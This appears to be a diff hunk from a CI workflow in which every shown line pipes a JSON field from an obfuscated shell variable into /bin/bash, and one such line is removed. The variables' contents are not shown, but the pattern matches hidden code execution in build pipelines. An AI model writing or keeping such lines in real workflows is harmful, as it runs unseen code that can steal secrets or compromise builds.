@@ -33,7 +33,6 @@ jobs:
           echo $gmjc3 | jq -r .ge9275 | /bin/bash
           echo $lhrl5159 | jq -r .t05165 | /bin/bash
           echo $cpndp5249 | jq -r .e5269 | /bin/bash
-          echo $zemzd2976 | jq -r .f6 | /bin/bash
           echo $eom3995 | jq -r .fnc0 | /bin/bash
           printf '%s' "$wp40" | jq -r .qvtm879 | /bin/bash
 
